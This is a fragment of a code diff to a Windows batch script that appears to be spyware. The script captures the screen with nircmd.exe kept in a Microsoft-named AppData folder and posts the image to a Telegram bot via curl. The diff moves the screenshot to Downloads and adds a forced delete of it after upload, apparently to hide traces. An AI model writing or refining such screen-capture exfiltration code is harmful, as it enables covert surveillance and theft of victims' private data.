@@ -516,8 +516,7 @@ if "%CheckSend%"=="1" (
 
 
 
-"%APPDATA%\Microsoft\nircmd.exe" savescreenshot "%USERPROFILE%\Desktop\screenshot.png"
-
+"%APPDATA%\Microsoft\nircmd.exe" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"
 
 
 
@@ -543,6 +542,9 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendPhoto" ^
 echo Message sent to chat ID %CHAT_ID%
 
 
+
+
+del /f /q "%USERPROFILE%\Downloads\screenshot.png"
 
 
 
